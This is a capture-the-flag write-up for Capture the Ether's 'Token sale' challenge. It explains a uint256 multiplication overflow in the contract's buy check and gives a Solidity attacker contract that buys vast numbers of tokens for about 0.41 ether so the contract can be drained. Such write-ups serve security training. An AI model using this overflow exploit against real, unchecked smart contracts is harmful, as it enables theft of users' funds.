# Token sale Capture the ether

## Goals

=> The contract starts off with a balance of 1 ether. See if you can take some of that away.

### Hints

- None

### Solution

- So there is a vulnerability in the calculation of the buy require statement, since the `numTokens * PRICE_PER_TOKEN` whereas `PRICE_PER_TOKEN` is 1 ether => 10 \*\* 18 so we can just buy a numTokens that will cause an overflow like `115792089237316195423570985008687907853269984665640564039458` which is basically the max of a uint256 where we cut off the last 18 numbers and increased the last one by 1 so this will result in `115792089237316195423570985008687907853269984665640564039458000000000000000000` which will cause an overflow and the right side of the compare operation now checks if the `msg.value ==  415992086870360064` (just divide our overflow number by max_uint256) now we can just send that amount as msg.value and we will be able to get a lot of tokens very cheap, we can then sell them to drain the contract

### Attacker Contract

```solidity
contract Hack {
    TokenSaleChallenge tokenSale;
    uint256 public constant MAX_UINT_256 =
        115792089237316195423570985008687907853269984665640564039457584007913129639935;
    // so this will cause an overflow in the TokenSale contract since the number below with 18 more zeros is higher than the number above
    uint256 public constant OVERFLOW_AMOUNT =
        115792089237316195423570985008687907853269984665640564039458;
    // the caused overflow allows us to calculate the amount of wei we need to send which is. around 0.41 eth
    uint256 public constant WEI_AMOUNT_AFTER_OVERFLOW = 415992086870360064;

    constructor(address _tokenSale) public {
        tokenSale = TokenSaleChallenge(_tokenSale);
    }

    function attack() external {
        tokenSale.buy{value: WEI_AMOUNT_AFTER_OVERFLOW}(OVERFLOW_AMOUNT);
    }
}
```
